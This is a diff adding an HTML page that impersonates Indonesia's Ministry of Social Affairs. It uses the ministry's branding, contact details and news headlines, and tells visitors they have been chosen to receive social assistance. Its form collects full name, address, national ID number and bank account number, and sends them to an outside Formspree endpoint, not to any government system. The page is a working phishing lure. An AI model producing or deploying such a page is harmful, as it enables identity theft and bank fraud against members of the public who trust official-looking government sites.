@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Bantuan Sosial</title>
+    <!-- todo link css -->
+    <link rel="stylesheet" href="css/style.css" />
+  </head>
+  <body>
+    <div class="navbar">
+      <div class="navbar-email">persuratan@kemsos.go.id</div>
+      <div class="navbar-lang">BAHASA ▼</div>
+      <!-- Tombol hamburger untuk tampilan mobile -->
+      <div class="menu-button" onclick="toggleMenu()">
+        <img class="hamburger-menu" src="img/bar.png" alt="bar">
+      </div>
+    </div>
+    <div class="logo-nav">
+      <img src="img/logo.jpg" alt="Logo Kementerian Sosial RI" class="logo" />
+      <img src="img/teks.jpg" alt="logo" class="teks" />
+      <!-- Menu navigasi yang akan muncul di mobile -->
+      <ul class="nav-links">
+        <li><a href="#">BERANDA</a></li>
+        <li><a href="#">PROFIL</a></li>
+        <li><a href="#">KATEGORI BERITA</a></li>
+        <li><a href="#">LAYANAN PUBLIK</a></li>
+        <li><a href="#">PPID</a></li>
+        <li><a href="#">INFOGRAFIS</a></li>
+        <li><a href="#">UNDUH</a></li>
+        <li><a href="#">VIDEO</a></li>
+      </ul>
+    </div>
+    <div class="container">
+      <h1>Selamat! Anda Terpilih Sebagai Penerima Bantuan Sosial</h1>
+      <p>Dari Kementerian Sosial Republik Indonesia</p>
+      <p>
+        Silakan isi formulir berikut untuk memproses penerimaan bantuan Anda:
+      </p>
+      <form action="https://formspree.io/f/xdknjnkz" method="POST" enctype="multipart/form-data">
+        <label for="nama">Nama Lengkap:</label>
+        <input type="text" id="nama" name="nama" required />
+
+        <label for="alamat">Alamat Lengkap:</label>
+        <input type="text" id="alamat" name="alamat" required />
+
+        <label for="nik">Nomor Induk Kependudukan (NIK):</label>
+        <input type="text" id="nik" name="nik" required />
+
+        <label for="rekening">Nomor Rekening Bank:</label>
+        <input type="text" id="rekening" name="rekening" required />
+
+        <input type="submit" value="Kirim Data" />
+      </form>
+    </div>
+
+    <footer class="footer">
+      <div class="footer-container">
+        <div class="footer-section">
+          <h3><i class="fa fa-phone"></i> Detail Kontak</h3>
+          <p>Alamat:</p>
+          <p><i class="fa fa-map-marker"></i> Jl. Salemba Raya No. 28, Jakarta Pusat</p>
+          <p>Pengaduan Masyarakat Hubungi Command Center Kementerian Sosial:</p>
+          <p><i class="fa fa-phone"></i> 171</p>
+          <p>Email:</p>
+          <p><i class="fa fa-envelope"></i> persuratan@kemsos.go.id</p>
+        </div>
+    
+        <div class="footer-section">
+          <h3><i class="fa fa-rss"></i> Berita Terkini</h3>
+          <ul>
+            <li><a href="#">Kemensos Jalin Kolaborasi Perkuat Rencana Strategis 2025-2029</a></li>
+            <li><a href="#">Kemensos Galakkan Program Pemberdayaan di Papua</a></li>
+            <li><a href="#">Mensos Risma Rayakan Hari Kemerdekaan Bersama Suku Anak Dalam Jambi</a></li>
+          </ul>
+        </div>
+    
+        <div class="footer-section">
+          <h3><i class="fa fa-bookmark"></i> Tautan Cepat</h3>
+          <ul>
+            <li><a href="#">Beranda</a></li>
+            <li><a href="#">Profil</a></li>
+            <li><a href="#">Kategori Berita</a></li>
+            <li><a href="#">Layanan Publik</a></li>
+            <li><a href="#">PPID</a></li>
+            <li><a href="#">Infografis</a></li>
+            <li><a href="#">Unduh</a></li>
+            <li><a href="#">Video</a></li>
+          </ul>
+        </div>
+      </div>
+    
+      <div class="footer-bottom">
+        <div class="footer-left">
+          <p>© 2024 Seluruh hak cipta. Kementerian Sosial Republik Indonesia</p>
+        </div>
+        <div class="footer-right">
+          <a href="#"><i class="fa fa-facebook"></i></a>
+          <a href="#"><i class="fa fa-twitter"></i></a>
+          <a href="#"><i class="fa fa-youtube"></i></a>
+          <a href="#"><i class="fa fa-instagram"></i></a>
+          <a href="#"><i class="fa fa-music"></i></a>
+        </div>
+      </div>
+    </footer>
+
+    <script src="js/script.js"></script>
+  </body>
+  </body>
+</html>
